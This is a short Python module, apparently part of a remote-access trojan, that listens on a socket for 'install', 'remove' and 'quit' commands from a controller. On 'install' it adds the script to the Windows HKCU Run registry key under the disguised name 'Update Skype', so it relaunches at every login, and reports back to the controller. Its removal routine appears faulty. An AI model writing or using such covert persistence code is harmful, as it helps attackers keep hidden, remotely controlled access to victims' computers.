import subprocess, os
import sys
from winreg import *


def install():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER,
                         keyVal, 0, KEY_ALL_ACCESS)


    SetValueEx(key2change, "Update Skype", 0, REG_SZ, new_file_path)


def clean():
    try:
        fp = os.path.dirname(os.path.realpath(__file__))
        file_name = sys.argv[0].split("\\")[-1]
        new_file_path = fp + "\\" + file_name
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

        key2change = OpenKey(HKEY_CURRENT_USER,
                             keyVal, 0, KEY_ALL_ACCESS)

        DeleteKey(key2change,"")
    except Exception as error:
        print(error)


def main(s):
    response = s.recv(1024)
    if response.decode("utf-8") == 'install':
        install()
        s.send(str.encode("Persistence [ON]"))
    elif response.decode("utf-8") == 'remove':
        clean()
        s.send(str.encode("Persistence [OFF]"))
    elif response.decode("utf-8") == 'quit':
        return False 

